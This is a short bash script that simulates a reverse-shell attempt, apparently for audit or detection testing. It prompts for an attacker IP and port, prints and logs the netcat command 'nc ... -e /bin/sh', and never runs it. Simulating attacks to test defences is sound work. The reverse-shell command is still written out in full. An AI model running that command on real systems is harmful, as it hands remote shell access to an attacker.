#!/bin/bash

read -p "[?] Enter attacker IP to simulate reverse shell: " ATTACKER_IP
read -p "[?] Enter port to simulate reverse shell: " ATTACKER_PORT

# Validate IP and port (basic)
if [[ ! $ATTACKER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ || ! $ATTACKER_PORT =~ ^[0-9]+$ ]]; then
    echo "[!] Invalid IP or port format."
    exit 1
fi

# Command to simulate
REV_CMD="nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh"

echo "[*] Simulating suspicious reverse shell command..."
echo "[+] Simulated command:"
echo "$REV_CMD"

# Log the command to a pretend audit file
echo "[SIMULATION] $(date) - Reverse shell attempted: $REV_CMD" >> /tmp/rev_shell_simulation.log

# Simulate delay and pretend execution (no actual connection)
sleep 2
echo "[*] (Simulation) Connecting to $ATTACKER_IP:$ATTACKER_PORT..."
sleep 2
echo "[*] (Simulation) Spawning shell... (Not really)"

echo "[*] Simulation complete. Log saved to /tmp/rev_shell_simulation.log"
